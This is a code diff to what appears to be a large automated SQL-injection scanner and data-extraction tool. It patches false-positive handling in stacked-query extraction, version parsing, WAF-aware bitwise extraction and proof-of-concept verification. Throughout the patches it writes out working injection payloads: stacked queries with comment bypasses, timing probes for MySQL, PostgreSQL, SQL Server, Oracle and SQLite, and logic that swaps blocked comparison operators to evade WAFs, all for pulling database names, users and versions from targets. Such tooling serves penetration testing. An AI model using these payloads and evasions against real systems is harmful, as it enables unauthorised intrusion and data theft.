@@ -64510,9 +64510,32 @@ class Scanner:
         _dbms = getattr(cfg, "forced_dbms", None) or getattr(cfg, "dbms", None) or enum.dbms or "MySQL"
         _det = enum.result
         _data = self.session.data
-        
+
         LOG.info("[StackedExtract] Stacked query extraction - DBMS: %s", _dbms)
-        
+
+        # BUG-V215-PATH-INJECT-STACKED-EXTRACT FIX (CRITICAL, all DBMSes, S technique,
+        # path-injection surfaces): On path-injection surfaces (param == 'path-injection'
+        # or URL contains '*' marker), stacked query SQL output is NEVER reflected in the
+        # HTTP response body — the server processes the URL path segment as SQL but returns
+        # query results in a side channel (error log, OOB channel), not in the HTTP response
+        # body. The body parser in _stacked_extract then extracts random identifiers from
+        # HTML content: "PUBLIC" from nav/header elements, "1.0" from HTTP version strings
+        # in error pages, producing fabricated DB values like "database: PUBLIC / user: PUBLIC
+        # / version: 1.0" that are completely detached from actual database state.
+        # Fix: detect path-injection surfaces and return False immediately — skip ALL body
+        # parsing for this extraction path and allow the caller to fall back to timing/OOB
+        # extraction engines that do not require HTTP response body reflection.
+        _se_inj_param = getattr(_det, 'param', '') or getattr(enum, 'param', '') or ''
+        _se_inj_url   = getattr(enum, 'url', '') or ''
+        _is_path_inject_se = (_se_inj_param == 'path-injection' or '*' in _se_inj_url)
+        if _is_path_inject_se:
+            LOG.info("[StackedExtract] Path-injection surface detected "
+                     "(param=%r, url_has_star=%r) — stacked SQL output is not reflected "
+                     "in HTTP response body; returning False to allow fallback to "
+                     "timing/OOB extraction engines that do not need response reflection.",
+                     _se_inj_param, '*' in _se_inj_url)
+            return False
+
         # CRITICAL: Get the detection payload that ALREADY WORKS
         _base_payload = getattr(_det, 'payload', '') or getattr(_det, 'exact_sent_payload', '')
         if not _base_payload:
@@ -64624,6 +64647,36 @@ class Scanner:
                 'true', 'false', 'null', 'undefined', 'window', 'document',
                 'jquery', 'bootstrap', 'angular', 'react', 'vue',
                 'no', 'yes', 'ok', 'error', 'success', 'warning', 'info',
+                # BUG-V215-STOP-WORDS-AUGMENT FIX (HIGH, all DBMSes, S technique,
+                # WAF-protected/path-injection/CDN-fronted surfaces):
+                # The existing stop-word lists missed common English words that appear
+                # in HTML nav menus, footers, error pages, and meta tags.  On targets
+                # where stacked SQL output is NOT reflected (path-injection, OOB-only),
+                # the body parser scans HTML content and extracts the first non-stop
+                # identifier as a "database name".  Words like "PUBLIC", "Login",
+                # "Admin", "System" appear routinely in HTML and were not blocked,
+                # producing fabricated DB values confirmed in production logs.
+                # Fix: extend both stop-word sets with common web/application words
+                # that are definitively NOT valid database/user/version identifiers.
+                'public', 'login', 'logout', 'admin', 'private', 'system',
+                'default', 'anonymous', 'guest', 'local', 'global', 'common',
+                'general', 'generic', 'internal', 'external', 'normal',
+                'standard', 'basic', 'advanced', 'debug', 'test', 'demo',
+                'sample', 'example', 'page', 'home', 'index', 'about',
+                'contact', 'help', 'search', 'register', 'profile', 'account',
+                'settings', 'dashboard', 'content', 'message', 'password',
+                'email', 'menu', 'sidebar', 'panel', 'modal', 'popup',
+                'notification', 'alert', 'status', 'type', 'version',
+                'release', 'update', 'latest', 'current', 'new', 'old',
+                'required', 'optional', 'enabled', 'disabled', 'active',
+                'inactive', 'valid', 'invalid', 'allowed', 'denied',
+                'protected', 'secure', 'plain', 'encoded', 'decoded',
+                'welcome', 'title', 'description', 'tag', 'list', 'item',
+                'result', 'results', 'total', 'count', 'size', 'length',
+                'start', 'end', 'begin', 'finish', 'complete', 'done',
+                'open', 'close', 'read', 'write', 'send', 'receive',
+                'request', 'response', 'session', 'cookie', 'token',
+                'redirect', 'forward', 'back', 'next', 'previous', 'more',
             })
 
             for stacked_query, label in stacked_payloads:
@@ -64762,8 +64815,52 @@ class Scanner:
                     elif label == "version":
                         _ver_m_se = _re.search(r'\b(\d+\.\d+[\d.a-zA-Z\-]*)\b', body)
                         if _ver_m_se:
-                            value = _ver_m_se.group(1)
-                        else:
+                            _ver_cand_se = _ver_m_se.group(1)
+                            # BUG-V215-VERSION-VALIDATE FIX (HIGH, all DBMSes, S technique,
+                            # WAF-protected/CDN-fronted/path-injection surfaces):
+                            # The broad regex r'\b(\d+\.\d+[\d.a-zA-Z\-]*)\b' matches any
+                            # version-like string in the response body — including "1.0" from
+                            # "HTTP/1.0" in error pages, "4.01" from "HTML 4.01", "0.7" from
+                            # JavaScript library versions, and "200.1" from IP addresses in logs.
+                            # On stacked extraction surfaces where SQL output is not reflected,
+                            # the first match in HTML content is extracted as the DB version.
+                            # Production logs confirmed this: "version: 1.0" was extracted from
+                            # a CDN error page (HTTP/1.0 version string in the response).
+                            # Fix: apply DBMS-aware plausibility validation before accepting
+                            # the version candidate. Each DBMS has a known major-version range;
+                            # candidates outside that range are rejected and the named-DBMS
+                            # brand-string fallback is tried instead.
+                            _ver_parts_se = _ver_cand_se.split('.')
+                            _ver_maj_str = _ver_parts_se[0] if _ver_parts_se else '0'
+                            _ver_maj_se = (int(_ver_maj_str)
+                                           if _ver_maj_str.isdigit() else 0)
+                            _ver_accept = False
+                            _dbms_upper_ver = (_dbms or '').upper()
+                            if 'MYSQL' in _dbms_upper_ver or 'MARIADB' in _dbms_upper_ver or 'TIDB' in _dbms_upper_ver:
+                                # MySQL 5.x / 8.x; MariaDB 10.x / 11.x; TiDB 5.x+
+                                _ver_accept = _ver_maj_se >= 5 and len(_ver_parts_se) >= 2
+                            elif 'POSTG' in _dbms_upper_ver or 'COCKROACH' in _dbms_upper_ver or 'YUGABYTE' in _dbms_upper_ver or 'REDSHIFT' in _dbms_upper_ver:
+                                # PostgreSQL 8.x / 9.x / 10-16; CockroachDB 20+; YugabyteDB 2+
+                                _ver_accept = _ver_maj_se >= 8 and len(_ver_parts_se) >= 1
+                            elif 'MSSQL' in _dbms_upper_ver or 'SQL SERVER' in _dbms_upper_ver:
+                                # SQL Server: 7.x (2000) through 16.x (2022)
+                                _ver_accept = _ver_maj_se >= 7 and len(_ver_parts_se) >= 2
+                            elif 'ORACLE' in _dbms_upper_ver:
+                                # Oracle 9i/10g/11g/12c/18c/19c/21c; major 9-21
+                                _ver_accept = _ver_maj_se >= 9 and len(_ver_parts_se) >= 2
+                            elif 'SQLITE' in _dbms_upper_ver:
+                                # SQLite 3.x (version 2.x is obsolete and not injectable)
+                                _ver_accept = _ver_maj_se >= 3 and len(_ver_parts_se) >= 2
+                            else:
+                                # Unknown DBMS: accept any X.Y with major >= 4
+                                _ver_accept = _ver_maj_se >= 4 and len(_ver_parts_se) >= 2
+                            if _ver_accept:
+                                value = _ver_cand_se
+                            else:
+                                LOG.debug("[StackedExtract] Version candidate %r rejected: "
+                                          "implausible for DBMS=%r (major=%d)",
+                                          _ver_cand_se, _dbms, _ver_maj_se)
+                        if not value:
                             _ver_b_se = _re.search(
                                 r'\b((?:MySQL|PostgreSQL|Microsoft SQL Server|Oracle|SQLite)[\w\s.,()/\-]{3,120})\b',
                                 body, _re.I)
@@ -86392,6 +86489,24 @@ class BitwiseExtractor:
         # BUG-BWE-002 FIX: Calibration is now done ONCE per string in extract_string(),
         # not per-character, eliminating 100+ extra HTTP requests per extraction.
         self._polarity_inverted: bool = False
+        # BUG-BWE-GT-BLOCKED-MISSING FIX (MEDIUM, all DBMSes, B/BH technique, WAF targets):
+        # BitwiseExtractor._binary_search_fallback reads getattr(self, '_gt_blocked', False)
+        # but BitwiseExtractor.__init__ never sets self._gt_blocked.  BitwiseExtractorV18
+        # sets it correctly at init (line ~148057).  When the original tamper chain contains
+        # 'between' or 'greatest' (signaling that the WAF blocks the > operator), the
+        # fallback binary search must use BETWEEN conditions instead of >=mid+1.  Without
+        # this flag, _binary_search_fallback always uses >=mid+1 on WAF-protected targets
+        # where > is blocked → every comparison probe returns the same WAF-block response
+        # → binary search converges to lo=0 → every fallback character returns None →
+        # all low-confidence characters produce None → extract_string returns a string
+        # shorter than the real value or full of '?' chars.
+        # Fix: derive _gt_blocked from the ORIGINAL tamper_chain (before strip) and also
+        # check config._waf_blocks_gt for targets discovered at scan-time.
+        _bwe_orig_tc = tamper_chain or []
+        self._gt_blocked = (
+            any(t in ('between', 'greatest') for t in _bwe_orig_tc) or
+            bool(getattr(config, '_waf_blocks_gt', False))
+        )
 
     @property
     def request_count(self) -> int:
@@ -125289,6 +125404,28 @@ class TechniqueCascadeEngine:
                         return _gsp_orig_attempt
                     # Fallback: return substituted normalised form (loses comments but fixes context)
                     return _gsp_norm_result
+
+        # BUG-MFP-STACKED-SELECT FIX (CRITICAL, all DBMSes, S technique, path-injection surfaces):
+        # Stacked query payloads like '/*c*/; SELECT 1', '/*c*/; SELECT USER()', etc.
+        # previously fell through all patterns and returned " AND 1=2-- -" as the false probe.
+        # On path-injection surfaces, the false-cond probe is injected into the URL path:
+        #   - True probe:       /path/*c*/;SELECT 1-- - → semicolon in path → 404 (big diff)
+        #   - False-cond probe: /path/ AND 1=2-- -      → no semicolon → 200 CDN-cached (diff≈0)
+        # When false-cond probe has diff≈0 (similar to baseline), the BUG-V215-S-CLEAN-DIFF check
+        # at detection phase sees _s_clean_diff2 ≤ 0.20 → fires "clean probe OK" → false positive.
+        # Fix: for payloads containing a semicolon (stacked query marker), preserve the full
+        # prefix (including bypass comments and quote prefix) and replace the stacked SQL
+        # statement with a neutral '; SELECT 0 -- -' that preserves the semicolon.
+        # Effect on path injection: false-cond probe ALSO has a semicolon → ALSO gets 404 →
+        # ALSO shows large diff from baseline → BUG-V215-S-CLEAN-DIFF fires → detection rejected.
+        # Effect on genuine stacked injection (non-path): '; SELECT 0 -- -' executes a neutral
+        # SELECT with no visible output → body diff remains ≈ 0 → clean probe passes correctly.
+        # The string-context prefix (quote/bypass comment before the semicolon) is preserved so
+        # the SQL context is valid.
+        _stacked_semi_m = _re.search(r'^(.*?)(;)', true_payload)
+        if _stacked_semi_m:
+            _s_prefix_part = _stacked_semi_m.group(1)  # everything before the first ';'
+            return f"{_s_prefix_part}; SELECT 0 -- -"
 
         _ctx_match = _re.match(r"^(\d+['\"`])", true_payload)
         if _ctx_match:
@@ -173737,6 +173874,84 @@ class PoCVerifier:
                 pass
         # Require at least 60% of the expected delay to account for network jitter
         _timing_thresh_ms = max((_sleep_sec * 1000) * 0.60, 800)
+
+        # BUG-V215-VERIFY-STACKED-PATH-INJECT FIX (CRITICAL, all DBMSes, S technique,
+        # path-injection surfaces): On path-injection surfaces (param == 'path-injection'
+        # or URL contains '*' marker), the stacked-query detection measures a body-diff
+        # caused by URL-path routing behavior (CDN/app-server responds differently to
+        # the modified path), NOT by SQL execution. The body-diff check in the
+        # non-timing branch measures (1.0 - sim) > 0.20 between:
+        #   - baseline: original URL path request (e.g. /Login.aspx → 50B 200 OK)
+        #   - injected: URL with stacked payload (e.g. /Login.aspx/*c*/;SELECT 0x1 → 1245B 404)
+        # Both genuine injections AND false positives (pure URL routing mismatches) produce
+        # large body diffs on path-injection surfaces, so body-diff cannot distinguish them.
+        # Production logs confirm: PoCVerifier failed 4/4 times (0 successes per round)
+        # despite the scanner reporting 5/5 multi-probe confirmation, because the body-diff
+        # check measured consistent URL-routing behavior (not SQL), and once PoCVerifier
+        # retried vs a fresh /Login.aspx clean baseline, the routing diff became 0.
+        # Fix: for path-injection + non-timing stacked detections, build a DBMS-appropriate
+        # timing verification probe (SLEEP/pg_sleep/WAITFOR/DBMS_LOCK) and verify via
+        # elapsed_ms instead of body similarity. If timing verification fails (0/N), the
+        # detection is classified as a false positive from URL routing and rejected.
+        _is_path_inject_pv = '*' in (url or '') or (result.param or '') == 'path-injection'
+        if _is_path_inject_pv and not _is_timing:
+            # Build DBMS-appropriate timing verification payload
+            _vs_dbms_upper = (getattr(result, 'dbms', '') or '').upper()
+            _vs_sleep_int  = max(2, int(round(_sleep_sec)))
+            _vs_sleep_float = max(2.0, float(_sleep_sec))
+            if 'MYSQL' in _vs_dbms_upper or 'MARIADB' in _vs_dbms_upper or 'TIDB' in _vs_dbms_upper:
+                _vs_timing_pl = f"; SELECT SLEEP({_vs_sleep_int}) -- -"
+            elif 'POSTG' in _vs_dbms_upper or 'COCKROACH' in _vs_dbms_upper or 'YUGABYTE' in _vs_dbms_upper:
+                _vs_timing_pl = f"; SELECT pg_sleep({_vs_sleep_float}) -- -"
+            elif 'MSSQL' in _vs_dbms_upper or 'SQL SERVER' in _vs_dbms_upper:
+                _vs_timing_pl = f"; WAITFOR DELAY '0:0:{_vs_sleep_int}' -- -"
+            elif 'ORACLE' in _vs_dbms_upper:
+                _vs_timing_pl = f"; BEGIN DBMS_LOCK.SLEEP({_vs_sleep_float}); END; -- -"
+            elif 'SQLITE' in _vs_dbms_upper:
+                # SQLite: RANDOMBLOB with large N creates CPU-bound delay (~1s per 50MB on modern HW)
+                _vs_timing_pl = f"; SELECT RANDOMBLOB(50000000) -- -"
+            else:
+                # Unknown DBMS: cannot safely build a timing probe; reject as unverifiable.
+                # Accepting without SQL execution proof would be a false positive.
+                LOG.warning("[PoCVerifier] Path-injection stacked: DBMS %r unknown — "
+                            "cannot build timing verification probe; classifying as "
+                            "unverifiable (false positive)", result.dbms)
+                return False, 0.0
+            # Time the timing probe vs a clean baseline
+            _vs_thresh_ms = max(_vs_sleep_float * 1000 * 0.60, 800)
+            try:
+                _vs_base_fp = await _send_injected(self.engine, method, url, data, data_fmt,
+                                                    result.param, original, tamper)
+                _vs_base_ms = (_vs_base_fp.elapsed_ms
+                               if _vs_base_fp and hasattr(_vs_base_fp, 'elapsed_ms') else 0)
+            except Exception:
+                _vs_base_ms = 0
+            _vs_successes = 0
+            for _vs_round in range(self.VERIFY_ROUNDS):
+                try:
+                    await asyncio.sleep(2.0)
+                    _vs_fp = await _send_injected(self.engine, method, url, data, data_fmt,
+                                                   result.param,
+                                                   original + _vs_timing_pl, tamper)
+                    if _vs_fp is None:
+                        continue
+                    _vs_delta = _vs_fp.elapsed_ms - _vs_base_ms
+                    if _vs_delta >= _vs_thresh_ms or _vs_fp.elapsed_ms >= _vs_thresh_ms:
+                        _vs_successes += 1
+                except Exception:
+                    pass
+            _vs_verified = _vs_successes >= 2
+            if _vs_verified:
+                LOG.info("[PoCVerifier] Path-injection stacked CONFIRMED via %r timing "
+                         "probe (%d/%d successes, threshold=%.0fms)",
+                         _vs_timing_pl[:40], _vs_successes, self.VERIFY_ROUNDS, _vs_thresh_ms)
+                return True, result.confidence
+            else:
+                LOG.warning("[PoCVerifier] Path-injection stacked REJECTED — timing probe "
+                            "did not fire (%d/%d successes, threshold=%.0fms, DBMS=%r). "
+                            "Detection was likely a URL-routing false positive, not SQL execution.",
+                            _vs_successes, self.VERIFY_ROUNDS, _vs_thresh_ms, result.dbms)
+                return False, 0.0
 
         successes = 0
         _base_fp = await _send_injected(self.engine, method, url, data, data_fmt,
